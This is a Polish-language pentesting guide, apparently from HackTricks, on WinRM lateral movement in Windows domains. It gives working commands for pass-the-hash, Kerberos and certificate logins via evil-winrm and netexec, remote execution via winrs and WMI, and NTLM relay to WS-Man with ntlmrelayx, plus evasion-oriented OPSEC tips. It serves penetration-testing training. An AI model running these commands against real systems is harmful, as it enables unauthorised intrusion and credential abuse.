# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM to jeden z najwygodniejszych transportów **lateral movement** w środowiskach Windows, ponieważ daje zdalną powłokę przez **WS-Man/HTTP(S)** bez potrzeby sztuczek z tworzeniem usługi SMB. Jeśli cel udostępnia **5985/5986** i Twój principal ma अनुमति używania remoting, często możesz bardzo szybko przejść od „valid creds” do „interactive shell”.

W kwestii **enumeration protokołu/usługi**, listeners, włączania WinRM, `Invoke-Command` i ogólnego użycia klienta, sprawdź:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Dlaczego operatorzy lubią WinRM

- Używa **HTTP/HTTPS** zamiast SMB/RPC, więc często działa tam, gdzie blokowane jest wykonanie w stylu PsExec.
- Przy **Kerberos** nie wysyła na cel wielokrotnego użytku poświadczeń.
- Działa sprawnie z narzędziami **Windows**, **Linux** i **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Interaktywny path PowerShell remoting uruchamia na celu **`wsmprovhost.exe`** w kontekście uwierzytelnionego użytkownika, co operacyjnie różni się od wykonania opartego na usłudze.

## Model dostępu i wymagania wstępne

W praktyce skuteczny lateral movement przez WinRM zależy od **trzech** rzeczy:

1. Cel ma **WinRM listener** (`5985`/`5986`) oraz reguły firewalla, które dopuszczają dostęp.
2. Konto może się **uwierzytelnić** do endpointu.
3. Konto ma prawo **otworzyć sesję remoting**.

Typowe sposoby uzyskania takiego dostępu:

- **Local Administrator** na celu.
- Członkostwo w **Remote Management Users** na nowszych systemach lub **WinRMRemoteWMIUsers__** na systemach/komponentach, które nadal honorują tę grupę.
- Jawnie delegowane uprawnienia remoting przez lokalne security descriptors / zmiany ACL PowerShell remoting.

Jeśli już kontrolujesz maszynę z uprawnieniami admina, pamiętaj, że możesz też **delegować dostęp do WinRM bez pełnego członkostwa w grupie adminów** używając technik opisanych tutaj:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas, które mają znaczenie podczas lateral movement

- **Kerberos wymaga hostname/FQDN**. Jeśli łączysz się po IP, klient zwykle przełącza się na **NTLM/Negotiate**.
- W przypadkach **workgroup** lub cross-trust NTLM często wymaga albo **HTTPS**, albo dodania celu do **TrustedHosts** na kliencie.
- Przy **local accounts** przez Negotiate w workgroup, UAC remote restrictions mogą blokować dostęp, chyba że używasz wbudowanego konta Administrator albo `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting domyślnie używa SPN **`HTTP/<host>`**. W środowiskach, gdzie **`HTTP/<host>`** jest już zarejestrowany do innego service account, WinRM Kerberos może zakończyć się błędem `0x80090322`; użyj SPN z portem albo przełącz się na **`WSMAN/<host>`**, jeśli taki SPN istnieje.

Jeśli trafisz na valid credentials podczas password spraying, sprawdzenie ich przez WinRM jest często najszybszym sposobem, by ocenić, czy dają shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec do validation i jednorazowego wykonania
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM do interaktywnych shelli

`evil-winrm` pozostaje najwygodniejszą interaktywną opcją z Linuxa, ponieważ obsługuje **hasła**, **NT hashy**, **Kerberos tickets**, **client certificates**, transfer plików oraz ładowanie PowerShell/.NET w pamięci.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

Gdy domyślny **`HTTP/<host>`** SPN powoduje błędy Kerberos, spróbuj zamiast tego zażądać/używać ticketu **`WSMAN/<host>`**. Występuje to w utwardzonych lub nietypowych środowiskach enterprise, gdzie **`HTTP/<host>`** jest już przypisany do innego konta usługi.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Jest to również przydatne po nadużyciu **RBCD / S4U**, gdy specjalnie sfałszowałeś lub zażądałeś biletu usługi **WSMAN** zamiast ogólnego biletu `HTTP`.

### Authentication oparte na certyfikacie

WinRM obsługuje również **client certificate authentication**, ale certyfikat musi być zmapowany na celu do **local account**. Z ofensywnego punktu widzenia ma to znaczenie, gdy:

- ukradłeś/wyeksportowałeś prawidłowy certyfikat klienta i private key już zmapowane dla WinRM;
- nadużyłeś **AD CS / Pass-the-Certificate**, aby uzyskać certyfikat dla principal, a następnie przejść do innej ścieżki uwierzytelniania;
- działasz w środowiskach, które celowo unikają zdalnego dostępu opartego na hasłach.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM jest znacznie mniej powszechny niż uwierzytelnianie hasłem/hash/Kerberos, ale gdy istnieje, może zapewnić **passwordless lateral movement** odporny na rotację haseł.

### Python / automation with `pypsrp`

Jeśli potrzebujesz automatyzacji zamiast powłoki operatora, `pypsrp` daje WinRM/PSRP z Pythona ze wsparciem dla **NTLM**, **certificate auth**, **Kerberos** i **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` jest wbudowany i przydatny, gdy chcesz **natywne wykonywanie poleceń WinRM** bez otwierania interaktywnej sesji PowerShell remoting:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Operacyjnie, `winrs.exe` często skutkuje zdalnym łańcuchem procesów podobnym do:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Warto to zapamiętać, ponieważ różni się to od service-based exec i od interaktywnych sesji PSRP.

### `winrm.cmd` / WS-Man COM zamiast PowerShell remoting

Możesz także wykonywać polecenia przez **WinRM transport** bez `Enter-PSSession`, wywołując klasy WMI przez WS-Man. To utrzymuje transport jako WinRM, a prymityw zdalnego wykonania zmienia się w **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Takie podejście jest przydatne, gdy:

- PowerShell logging jest mocno monitorowany.
- Chcesz **WinRM transport**, ale nie klasycznego workflow z PS remoting.
- Budujesz lub używasz własnych narzędzi wokół obiektu COM **`WSMan.Automation`**.

## NTLM relay to WinRM (WS-Man)

Gdy SMB relay jest blokowany przez signing, a LDAP relay jest ograniczony, **WS-Man/WinRM** może nadal być atrakcyjnym celem relay. Współczesny `ntlmrelayx.py` zawiera **WinRM relay servers** i może relayować do celów **`wsman://`** lub **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Dwie praktyczne uwagi:

- Relay jest najbardziej użyteczny, gdy cel akceptuje **NTLM** i relayed principal ma अनुमति użycia WinRM.
- Nowszy kod Impacket specjalnie obsługuje żądania **`WSMANIDENTIFY: unauthenticated`**, więc probe w stylu `Test-WSMan` nie psują flow relay.

Dla ograniczeń multi-hop po uzyskaniu pierwszej sesji WinRM sprawdź:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Uwagi OPSEC i detection

- **Interaktywne PowerShell remoting** zwykle tworzy **`wsmprovhost.exe`** na celu.
- **`winrs.exe`** zwykle tworzy **`winrshost.exe`**, a potem żądany child process.
- Spodziewaj się telemetryki **network logon**, eventów usługi WinRM oraz PowerShell operational/script-block logging, jeśli używasz PSRP zamiast surowego `cmd.exe`.
- Jeśli potrzebujesz tylko jednej komendy, `winrs.exe` lub jednorazowe wykonanie WinRM może być cichsze niż długo żyjąca interaktywna sesja remoting.
- Jeśli Kerberos jest dostępny, preferuj **FQDN + Kerberos** zamiast IP + NTLM, aby zmniejszyć zarówno problemy z trust, jak i niezręczne zmiany `TrustedHosts` po stronie klienta.

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
